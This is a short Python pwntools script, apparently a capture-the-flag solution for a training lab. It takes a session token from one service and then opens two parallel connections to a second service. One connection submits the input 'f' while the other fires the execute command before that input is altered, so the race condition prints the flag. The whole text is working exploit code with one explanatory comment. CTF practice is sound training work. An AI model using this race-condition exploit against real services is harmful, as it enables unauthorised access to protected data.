from pwn import *

def get_token(c):
    c.recvuntil(b"token: ")
    return c.recvline().strip()


c_token = remote("swiss.training.offensivedefensive.it", 8080, ssl=True)

token = get_token(c_token)
c_token.close()
print(token)

c_1 = remote("private.training.offensivedefensive.it", 8080, ssl=True)
c_1.recvuntil(b"Token: ")
c_1.sendline(token)

c_2 = remote("private.training.offensivedefensive.it", 8080, ssl=True)
c_2.recvuntil(b"Token: ")
c_2.sendline(token)


# Program gets input then modifies it if it is a 'f' that will print the flag
# Send input then execute with c_2 before it gets modified
c_1.recvuntil(b"Execute the command chain\n")
c_2.recvuntil(b"Execute the command chain\n")
c_1.sendline(b"1")
c_1.recvuntil(b"> ")
c_1.sendline(b"f")
sleep(0.1)
c_2.sendline(b"4")

print(c_2.recvline())
print(c_2.recvline())